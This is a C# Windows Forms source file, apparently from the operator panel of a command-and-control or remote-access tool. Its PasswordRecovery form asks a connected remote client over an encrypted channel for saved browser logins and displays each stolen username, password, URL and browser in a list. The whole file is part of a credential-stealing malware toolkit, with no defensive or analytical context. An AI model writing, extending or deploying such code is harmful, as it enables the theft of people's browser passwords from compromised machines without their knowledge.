using CNC.Core.Data;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BrowserTools;
using System.Windows.Forms;
using CNC.Core.Security;
using Newtonsoft.Json;

namespace CNC.Forms
{
    public partial class PasswordRecovery : Form
    {
        Client currentClient;
        LoginData[] logins;
        public PasswordRecovery(Client client)
        {
            InitializeComponent();
            currentClient = client;
            Recover();
        }

        void Recover()
        {
            listView.Items.Clear();
             logins = JsonConvert.DeserializeObject<LoginData[]>(
                Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("RecoverLoginReq", "RecoverLoginRep", 20000, 
                Cryptography.Encrypt(Guid.NewGuid().ToString()))));

            for (int i = 0; i < logins.Length; i++)
            {
                listView.Items.Add(new ListViewItem(new string[] { logins[i].Username, logins[i].Password, logins[i].Url, logins[i].Browser.ToString() }));
            }
        }
    }
}
